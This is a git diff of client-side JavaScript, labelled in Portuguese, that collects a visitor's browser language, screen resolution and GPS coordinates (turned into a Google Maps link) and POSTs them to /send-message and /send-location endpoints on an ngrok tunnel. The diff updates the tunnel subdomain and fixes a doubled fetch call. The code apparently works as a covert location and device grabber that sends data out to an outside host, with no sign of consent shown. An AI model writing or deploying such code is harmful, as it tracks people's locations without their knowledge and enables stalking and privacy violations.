@@ -44,8 +44,7 @@
 🌎 Idioma: ${browserInfo.language}
 📏 Resolução: ${browserInfo.screen.width}x${browserInfo.screen.height}`;
 
-  fetch(
-      fetch("https://b568-2804-d59-8c25-2f00-1c4d-a13f-874c-6127.ngrok-free.app/send-message", {
+  fetch("https://ba79-2804-d59-8c25-2f00-1c4d-a13f-874c-6127.ngrok-free.app/send-message", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
@@ -77,7 +76,7 @@
       const longitude = position.coords.longitude;
       const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-      fetch("https://b568-2804-d59-8c25-2f00-1c4d-a13f-874c-6127.ngrok-free.app/send-location", {
+      fetch("https://ba79-2804-d59-8c25-2f00-1c4d-a13f-874c-6127.ngrok-free.app/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
